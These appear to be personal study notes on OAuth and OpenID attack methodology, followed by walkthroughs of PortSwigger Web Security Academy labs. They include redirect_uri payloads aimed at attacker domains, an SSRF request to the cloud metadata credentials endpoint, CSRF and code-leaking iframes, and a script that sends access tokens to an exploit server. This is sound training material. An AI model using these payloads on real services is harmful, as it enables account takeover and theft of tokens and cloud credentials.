# Oauth Notes

[Portswigger](https://portswigger.net/web-security/oauth)
[Research](https://portswigger.net/research/hidden-oauth-attack-vectors)

## Methodology

Grant Types:

- authorization code grant type
- implicit grant type

In implicit grant types the browser does more redirects, leading to possible exposure of the tokens an attacker can abuse, look for the auth endpoint setting the `response_type` to `token`

Identify: Look for options to sign in with a different website, also look in your HTTP history for any `/authorization` or similar flows that start a flow. Keep an eye out for these params: `client_id` `redirect_uri` and `response_type`

Once you know the hostname of the authorization server, you should always try sending a GET request to the following standard endpoints:

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

These will often return a JSON configuration file containing key information, such as details of additional features that may be supported

**Vuln structure to look into:**
- in client
  - improper implementation of the implicit grant type
  - flawed csrf protection
- vulns in the oauth service
  - leaking auth codes and access tokens
  - flawed scope validation
  - unverified user registration

**csrf related**

Look for flows that do not send a `state` parmater, this opens up the flow to csrf possibilities

**Redirect uri**

When auditing an OAuth flow, you should try experimenting with the redirect_uri parameter to understand how it is being validated. If you can append extra values to the default redirect_uri parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service: Example: `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`

You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters: `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`

Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`

Also just attempt to point this `redirect_uri` to any domains, and test if they whitelist what's allowed


**other**

- look for dangerous JavaScript that handles query parameters and URL fragments
- XSS Vulnerabilities
- HTML injection vulns


### OpenID

OpenID is used in oauth flows if you see an additional extra response type of: `id_token`
This returns a JSON web token (JWT) signed with a JSON web signature (JWS). The JWT payload contains a list of claims based on the scope that was initially requested

- Relying party - The application that is requesting authentication of a user. This is synonymous with the OAuth client application.
- End user - The user who is being authenticated. This is synonymous with the OAuth resource owner.
- OpenID provider - An OAuth service that is configured to support OpenID Connect

The term "claims" refers to the key:value pairs that represent information about the user on the resource server.

standard scopes:
- profile
- email
- address
- phone

**identifying**
OpenID may expose the crypto keys for signature verification at `/.well-known/jwks.json`

Look for the `openid` scope, even if it doesn't appear to use you can simply add the `openid` scope or changing the response type to `id_token` and observe whether this results in and error. also look for `/.well-known/openid-configuration`

**other openid**

Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. If this feature is supported, you can send a single request_uri parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values. Depending on the configuration of the OAuth service, this request_uri parameter is another potential vector for SSRF.

You might also be able to use this feature to bypass validation of these parameter values. Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the redirect_uri

look for possible `request_uri_parameter_supported` options in the configuration file and documentation

you can just try adding the `request_uri` parameter to see if it works

## Labs walkthrough

### Authentication bypass via OAuth implicit flow

Background:

```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net
```

- click `my account` and complete the oauth login process, afterwards you will be redirected back to the blog website
- study the requests and responses that make up the oauth flow, this starts from the `GET /auth?client_id=[...]` request
- notice that the client application receives some basic information about the user from the oauth service, it then logs the user in by sending a `POST` request containing this information to its own `/authenticate` endpoint, along with the access token
- send the `POST /authenticate` request to repeater, then change the email address to `carlos@carlos-montoya.net` and send it, notice you don't encounter an error
- right click on the `POST ` request and select `Request in browser > In original session` copy this and open the browser to access carlos' account

### SSRF via OpenID dynamic client registration

Background:

```
This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment. 
```

- log into your own account, browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration`, to get to the configuration file and notice that the client registration endpoint is located at `/reg`
- in repeater create a suitable `POST` request to register your own client application with the oauth service, you must at least provide a `redirect_uris` array containing an arbitrary whitelist of callbacks URIs for your fake application

```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```
  
- sned the request and observe that you have now successfully registered your own client application without requiring any authentication, the response contains various metadata associated with your new client application, including a new `client_id`
- using burp audit the oauth flow, notice the authorize page where the user consents to the requesetd permissions, and displays the client applications logo. this is fetched from `/client/CLIENT-ID/logo`, we know from the OpenID that client applications can provide the URL for their logo using `logo_uri` during dynamic registration, send the `GET /client/CLIENT-ID/logo` to repeater
- in repeater go back to the `POST /reg` request that you created earlier, add the `logo_uri` property with the value of a collaborator payload should look like this:

```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```

- send the request and copy the `client_id` from the response
- in repeater go to the `GET /client/CLIENT-ID/logo` request, replace the `client_id` of the path with what you got from above
- go to collaborator tab and poll it, notice the HTTP interaction attempting to fetch your non-existent logo, this confirms that you can successfully use the `logo_uri` property to elicit requests from the oauth server
- go back to the `POST /reg` request in repeater and replace the current `logo_uri` value with the target URL `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`
- send this request and copy the new `client_id` from the response
- go back to the `GET /client/CLIENT-ID/logo` replace the `client_id` with the one above and observe that you can now see the sensitive metadata for the oauth providers cloud environment including the secret access key, submit this to complete

### Forced OAuth profile linking

Background:

```
This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts
```

- click `my account` and select to log in with your social media profile, log in normally with the classic form
- notice that you have the option to attach your social media profile to your existing account, use this functionality to log in with the social meda site
- log out and then click `my account` and this time choose, `log in with social media`, notice you are instantly logged in
- study the history and observe that a series of requests for attaching a social profile, in the  `GET /auth?client_id[...]` request observe that the `redirect_uri` for this functionality sends the auth code to `/oauth-linking` notice that this request does not include a `state` parameter to protect against CSRF attacks
- with intercept on select the `Attach a social profile` option again
- forward the requests until you have intercepted the one for `GET /oath-linking?code=[...]` right click on this request and select `copy url`
- drop the request, this is important to ensure that the code is not used and therefore remains valid
- turn off the intercept and log out of the blog website
- go to the exploit server and create an `iframe` in which the `src` attribute points to the URL you just copied, the result should look like this: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
- deliever the exploit to the victim, when their browser loads the iframe, it will complete the oauth flow using your social media profile, attaching it to the admin acocunt on the blog website
- go back to the blog website and select `log in with social media` option again and observe that you are instantly logged in as the admin user, go to the admin panel and delete `carlos` to solve the lab

### OAuth account hijacking via redirect_uri

Background: 

```
This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter
```

- click `my account` and complete the oauth login process
- log out and then log back in again, observe that you are logged in instantly this time
- in burp study the oauth flow, identify the most recent auth request, this should start with `GET /auth?client_id=[...]` notice that when this request is sent, you are immediately redirected to the `redirect_uri` along with the auth code in the query string, send this auth request to repeater
- in repeater observe that you can submit any arbitrary value as the `redirect_uri` without encountering and error, notice that your input is used to generate the redirect in the response
- change the `redirect _uri` to point to the exploit server, then send the request and follow the redirect, go to the exploit servers access log and observe that there is a log entry containing an auth code, this confirms you can leak auth codes to an external domain
- go back to the exploit server and create the following iframe at /exploit: `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
- store and click `view exploit` check that your iframe loads and then check the exploit servers access log, if everything is working correctly you should see another request with a leaked code
- deliver the exploit to the victim, then go back to the access log and copy the victims code from the resulting request
- log out of the blog website and then use the stolen code to navidate to: `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`, the rest of the oauth flow will be completed automatically and you will be logged in as the admin user, open the admin panel and delete `carlos` to solve the lab

### Stealing OAuth access tokens via an open redirect

Background:

```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service

note: You cannot access the admin's API key by simply logging in to their account on the client application
```

- go to `my account` and complete the oauth login process
- study the resulting requests and responses, notice that the blog website makes an API to the userinfo endpoint at `/me` and then uses the data it fetches log the user in, send the `GET /me` to repeater
- log out and log back in, from the history find the most recent `GET /auth?client_id=[...]` request and send it to repeater
- in repeater, experminet with the `GET /auth?client_id=[...]` request and observe you cannot supply and external domain as `redirect_uri`, however you can append addtional characters to the default value wihout encountering and error, including the `/../` path traversal sequence
- log out of your account on the blog website and turn on intercept
- log in again and go to the intercepted `GET /auth?client_id=[...]`  request
- confirm that the `redirect_uri` param is in fact vulnerable to directory traversal by changing it to `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1` forward any remaining requests and observe that you are redirected to the first blog post
- in burp audit the other pages on the blog website and identify the `next post` option at the bottom of each blog post, which works by redirecting users to the path specified in the query parameter, send the corresponding `GET /post/next?path=[...]` to repeater
- in repeater experiment with the `path` param notice that this is an open redirect, you can even supply an absolute URL to elicit a redirect to a completely different domain
- craft a malicious URL that combines these vulns, you need a URL that will initiate an oauth flow with the `redirect_uri` pointing to the open redirect, which subsequently forwards the victim to your exploit server `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
- test that this URL works correctly by visiting it in the browser, you should be redirected to the exploit server
- on the exploit server create a suitable script at `/exploit` that will extract the fragment and output it somewhere for example:

```
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

- to test that it is working, store the exploit and visit your malicious URL again in the browser, then go tto the exploit server access log there should be a request for `GET /?access_token=[...]`
- deliver the exploit to the victim, then copy their access token from the log
- in repeater go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied, send the request, and observe that you made an successful API call to fetch the victim's data

